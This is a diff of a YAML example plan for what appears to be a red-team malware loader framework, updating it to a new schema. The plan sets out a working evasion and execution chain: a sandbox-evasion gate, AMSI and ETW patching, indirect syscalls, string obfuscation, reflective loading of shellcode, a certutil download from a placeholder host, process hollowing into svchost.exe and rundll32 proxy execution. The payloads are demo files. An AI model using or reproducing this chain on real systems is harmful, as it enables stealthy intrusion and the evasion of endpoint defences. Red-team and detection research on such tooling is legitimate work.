@@ -1,33 +1,47 @@
-# Complex multi-stage plan (schema 5).
+# Complex multi-step plan (schema 6).
 #
-# One artifact runs an ordered chain of actions across three payloads and two
+# One artifact runs an ordered chain of steps across three payloads and two
 # living-off-the-land commands. It exercises most of the feature:
 #
-#   0. recon   technique: bouncer gate + patch_amsi/patch_etw, then a returning
-#              shellcode (demo_shellcode.bin, `mov eax, 42; ret`) in-process.
-#   1. fetch   exec: download the next artifact with a signed Microsoft binary.
-#              `on_fail: continue` so an unreachable host does not abort.
-#   2. implant technique: hollow test_payload.exe into svchost.exe. A separate
-#              process, so the loader keeps control and the chain continues.
-#   3. dwell   sleep: wait between actions.
-#   4. proxy   exec: proxy execution via another signed binary, detached.
-#   5. payload technique: reflectively load a PE *executable*. This is a
-#              TERMINAL stage (the payload calls ExitProcess), so it must be
-#              last — `plan::validate` rejects it anywhere else.
+#   0. recon   bouncer gate + patch_amsi/patch_etw, then a returning shellcode
+#              (demo_shellcode.bin, `mov eax, 42; ret`) in-process.
+#   1. fetch   living_off_the_land: download the next artifact with a signed
+#              Microsoft binary. `on_fail: continue` so an unreachable host does
+#              not abort.
+#   2. implant process_hollowing: hollow test_payload.exe into svchost.exe. A
+#              separate process, so the loader keeps control and the chain
+#              continues.
+#   3. dwell   sleep: wait between steps.
+#   4. proxy   living_off_the_land: proxy execution via another signed binary,
+#              detached.
+#   5. payload reflective_loading of a PE *executable*. This is a TERMINAL step
+#              (the payload calls ExitProcess), so it must be last —
+#              `plan::validate` rejects it anywhere else.
 #
 # Loader-wide: `syscalls.mode: indirect` (Tartarus Gate) removes the NT imports
 # from the stub's IAT; `build.stub.strings` obfuscates every stub literal. Each
-# payload is embedded and encrypted with its own key/nonce, and each stage
+# payload is embedded and encrypted with its own key/nonce, and each step
 # delivers its own `args`.
 #
 #   cargo run -- build examples/plans/multistage-advanced.yaml
 #   cargo run -- build examples/plans/multistage-advanced.yaml --dry-run
 #   .\dist\multistage_advanced.exe
 
-schema: 5
+schema: 6
 name: multistage-advanced
 
 build:
+  payloads:
+    dropper:
+      source: ./examples/payloads/demo_shellcode.bin
+      format: shellcode
+      args: ["--phase=recon"]
+    implant:
+      source: ./examples/payloads/test_payload.exe
+      args: ["--phase=implant"]
+    final:
+      source: ./examples/payloads/test_payload.exe
+
   stub:
     syscalls:
       mode: indirect
@@ -37,93 +51,58 @@ build:
       key: random
   output:
     path: ./dist/multistage_advanced.exe
-    arch: x64
-    strip: true
-    trim_paths: all
-    subsystem: console
-    manifest: true
     resources:
       icon: ./examples/assets/sample.ico
       version_info:
         randomize: true
 
-stages:
+runtime:
   # 0. Gate + in-process preparation, then a returning shellcode.
-  - name: recon
-    action: technique
+  - technique: bouncer
+    params:
+      mode: all
+      on_fail: silent
+      min_ram_mb: 512
+      not_in_sandbox: true
     delay_ms: 250
-    on_success: continue
     on_fail: stop
-    payload:
-      source: ./examples/payloads/demo_shellcode.bin
-      format: shellcode
-      args: ["--phase=recon"]
-      crypto:
-        algo: xchacha20poly1305
-        key: random
-    runtime:
-      - technique: bouncer
-        params:
-          mode: all
-          on_fail: silent
-          min_ram_mb: 512
-          not_in_sandbox: true
-      - technique: patch_amsi
-      - technique: patch_etw
-      - technique: reflective_loading
+  - technique: patch_amsi
+  - technique: patch_etw
+  - technique: reflective_loading
+    params: { payload: dropper }
 
   # 1. Living off the land: stage the next artifact with a signed binary.
-  - name: fetch
-    action: exec
-    binary: certutil.exe
-    args: ["-urlcache", "-split", "-f", "https://example.invalid/next.bin", "C:\\Users\\Public\\next.bin"]
-    wait: true
-    timeout_s: 30
-    window: hidden
-    on_success: continue
+  - technique: living_off_the_land
+    params:
+      binary: certutil.exe
+      args: ["-urlcache", "-split", "-f", "https://example.invalid/next.bin", "C:\\Users\\Public\\next.bin"]
+      wait: true
+      timeout_s: 30
+      window: hidden
     on_fail: continue
 
   # 2. Hollow a full PE into a legitimate process (separate process).
-  - name: implant
-    action: technique
-    on_success: continue
+  - technique: process_hollowing
+    params:
+      payload: implant
+      target: "C:\\Windows\\System32\\svchost.exe"
     on_fail: stop
-    payload:
-      source: ./examples/payloads/test_payload.exe
-      format: pe
-      args: ["--phase=implant"]
-      crypto:
-        algo: xchacha20poly1305
-        key: random
-    runtime:
-      - technique: process_hollowing
-        params:
-          target: "C:\\Windows\\System32\\svchost.exe"
 
-  # 3. Dwell between actions.
-  - name: dwell
-    action: sleep
-    sleep_ms: 1500
+  # 3. Dwell between steps.
+  - technique: sleep
+    params: { ms: 1500 }
 
   # 4. Proxy execution via another signed binary, detached (the loader keeps
   #    control immediately).
-  - name: proxy
-    action: exec
-    binary: rundll32.exe
-    args: ["C:\\Users\\Public\\next.bin,EntryPoint"]
-    wait: false
-    window: hidden
+  - technique: living_off_the_land
+    params:
+      binary: rundll32.exe
+      args: ["C:\\Users\\Public\\next.bin,EntryPoint"]
+      wait: false
+      window: hidden
     on_fail: exit
 
-  # 5. Terminal stage: reflectively load a PE executable (it calls ExitProcess).
-  - name: payload
-    action: technique
+  # 5. Terminal step: reflectively load a PE executable (it calls ExitProcess).
+  - technique: reflective_loading
+    params: { payload: final }
     on_success: continue
-    payload:
-      source: ./examples/payloads/test_payload.exe
-      format: pe
-      crypto:
-        algo: xchacha20poly1305
-        key: random
-    runtime:
-      - technique: reflective_loading
